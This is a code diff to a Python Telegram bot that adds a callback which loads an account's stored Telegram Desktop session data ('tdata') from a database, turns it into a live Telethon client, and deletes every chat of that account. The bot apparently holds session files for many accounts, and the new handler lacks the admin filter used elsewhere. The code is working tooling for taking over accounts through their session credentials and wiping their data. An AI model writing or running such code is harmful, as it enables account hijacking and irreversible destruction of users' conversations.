@@ -803,6 +803,46 @@ async def clean_db(client, message):
     result = await db.col.delete_many({})
     await message.reply(f"✅ Database cleaned. Deleted {result.deleted_count} accounts.")
 
+@Client.on_callback_query(filters.regex(r"^delchats_(\d+)$"))
+async def delete_all_chats(client, callback_query):
+    acc_num = int(callback_query.data.split("_")[1])
+    doc = await db.col.find_one({"account_num": acc_num})
+    if not doc:
+        return await callback_query.message.edit("❌ Account not found.")
+
+    temp_dir = tempfile.mkdtemp()
+    tdata_zip = os.path.join(temp_dir, "tdata.zip")
+    with open(tdata_zip, "wb") as f:
+        f.write(base64.b64decode(doc["tdata"]))
+
+    extract_dir = os.path.join(temp_dir, "tdata")
+    with zipfile.ZipFile(tdata_zip, "r") as zip_ref:
+        zip_ref.extractall(extract_dir)
+
+    try:
+        tdesk = TDesktop(extract_dir)
+        if not tdesk.isLoaded():
+            return await callback_query.answer("⚠️ Failed to load (corrupted tdata)", show_alert=True)
+
+        tele_client = await tdesk.ToTelethon(session=None, flag=UseCurrentSession)
+        await tele_client.connect()
+
+        if not await tele_client.is_user_authorized():
+            return await callback_query.answer("⚠️ Not authorized (needs login / 2FA)", show_alert=True)
+
+        # fetch all dialogs (users, groups, channels)
+        async for dialog in tele_client.iter_dialogs():
+            try:
+                await tele_client.delete_dialog(dialog.id)
+            except Exception as e:
+                print(f"❌ Failed to delete {dialog.name or dialog.id}: {e}")
+
+        await callback_query.answer("✅ All chats deleted successfully!", show_alert=True)
+
+    except Exception as e:
+        await callback_query.answer(f"❌ Error: {str(e)}", show_alert=True)
+    finally:
+        shutil.rmtree(temp_dir)
 
 
 @Client.on_message(filters.command("show_db") & filters.private & filters.user(ADMINS))
